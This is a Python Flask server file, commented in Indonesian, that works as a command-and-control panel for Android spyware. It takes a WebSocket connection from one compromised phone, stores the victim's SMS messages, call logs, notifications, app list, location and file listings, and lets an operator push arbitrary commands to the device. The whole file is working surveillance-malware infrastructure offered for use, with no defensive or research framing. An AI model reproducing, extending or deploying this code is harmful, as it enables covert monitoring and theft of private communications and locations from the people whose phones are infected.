import os
import json
import base64
import threading
from datetime import datetime
from flask import Flask, request, jsonify, send_from_directory
from flask_sock import Sock

# --- Konfigurasi Aplikasi ---
# Baris ini SANGAT PENTING. Gunicorn mencari variabel bernama 'app'.
app = Flask(__name__)
sock = Sock(app)

# Menonaktifkan logging standar Flask untuk tampilan yang bersih
import logging
log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR)

# --- State Management (Penyimpanan Status Global) ---
class C2State:
    def __init__(self):
        self.device_socket = None
        self.device_info = {}
        self.notifications = []
        self.sms_list = []
        self.call_logs = []
        self.app_list = []
        self.location = None
        self.file_manager = {'path': '/', 'files': []}
        self.command_history = []
        self.lock = threading.Lock()

    def set_socket(self, ws):
        with self.lock:
            self.device_socket = ws

    def clear_socket(self):
        with self.lock:
            self.device_socket = None
            self.device_info = {}

    def is_connected(self):
        return self.device_socket is not None

    def add_notification(self, data):
        with self.lock:
            notif = {
                'title': data.get('title', 'N/A'),
                'text': data.get('text', 'N/A'),
                'package': data.get('packageName', 'N/A'),
                'time': datetime.now().strftime('%H:%M:%S')
            }
            self.notifications.insert(0, notif)
            self.notifications = self.notifications[:100]

    def add_command_history(self, command, response="Sent"):
        with self.lock:
            entry = { "command": command, "response": response, "time": datetime.now().strftime('%H:%M:%S') }
            self.command_history.insert(0, entry)
            self.command_history = self.command_history[:50]
    
    def send_command(self, command, params={}):
        if not self.is_connected():
            return False, "Device not connected"
        try:
            payload = json.dumps({"command": command, "params": params})
            self.device_socket.send(payload)
            self.add_command_history(f"{command} {json.dumps(params)}")
            return True, "Command sent"
        except Exception as e:
            print(f"[ERROR] Failed to send command: {e}")
            self.clear_socket()
            return False, str(e)

c2_state = C2State()

DOWNLOADS_DIR = 'device_downloads'
if not os.path.exists(DOWNLOADS_DIR):
    os.makedirs(DOWNLOADS_DIR)

# --- Handler untuk Koneksi WebSocket dari Perangkat ---
@sock.route('/c2')
def c2_socket_handler(ws):
    if c2_state.is_connected():
        print("[INFO] Rejecting new device connection, one is already active.")
        ws.close(); return
    print("[SUCCESS] Device connected via WebSocket.")
    c2_state.set_socket(ws)
    try:
        while True:
            data = ws.receive()
            if data is None: break
            process_device_data(data)
    except Exception as e:
        print(f"[ERROR] WebSocket connection error: {e}")
    finally:
        print("[INFO] Device disconnected.")
        c2_state.clear_socket()

def process_device_data(data):
    try:
        payload = json.loads(data).get('data', {})
        log_type = payload.get('type', 'UNKNOWN')
        with c2_state.lock:
            if log_type == 'DEVICE_INFO': c2_state.device_info = payload.get('info', {})
            elif log_type == 'NOTIFICATION_DATA': c2_state.add_notification(payload.get('notification', {}))
            elif log_type == 'SMS_LOG': c2_state.sms_list = payload.get('logs', [])
            elif log_type == 'CALL_LOG': c2_state.call_logs = payload.get('logs', [])
            elif log_type == 'APP_LIST': c2_state.app_list = payload.get('apps', [])
            elif log_type == 'LOCATION_SUCCESS': c2_state.location = {'url': payload.get('url'), 'time': datetime.now().strftime('%H:%M:%S')}
            elif log_type == 'LOCATION_FAIL': c2_state.location = {'error': payload.get('error'), 'time': datetime.now().strftime('%H:%M:%S')}
            elif log_type == 'FILE_MANAGER_RESULT':
                c2_state.file_manager['path'] = payload.get('current_path', '/')
                c2_state.file_manager['files'] = payload.get('files', [])
            else:
                c2_state.add_command_history(log_type, "Response received")
    except Exception as e:
        print(f"[ERROR] Failed to process device data: {e}")

# --- API Endpoints untuk Frontend Web ---
@app.route('/')
def index():
    # Menyajikan file index.html dari direktori yang sama
    return send_from_directory('.', 'index.html')

@app.route('/api/status')
def get_status():
    with c2_state.lock:
        return jsonify({'connected': c2_state.is_connected(), 'device_info': c2_state.device_info})

@app.route('/api/data/<data_type>')
def get_data(data_type):
    with c2_state.lock:
        data_map = {
            'notifications': c2_state.notifications, 'sms': c2_state.sms_list,
            'calllogs': c2_state.call_logs, 'apps': c2_state.app_list, 'location': c2_state.location,
            'filemanager': c2_state.file_manager, 'history': c2_state.command_history,
        }
    return jsonify(data_map.get(data_type, []))

@app.route('/api/command', methods=['POST'])
def handle_command():
    data = request.json
    command, params = data.get('command'), data.get('params', {})
    success, message = c2_state.send_command(command, params)
    if success: return jsonify({'status': 'ok'})
    else: return jsonify({'status': 'error', 'message': message}), 500

# Blok if __name__ == "__main__" tidak diperlukan karena Gunicorn yang akan menjalankan server
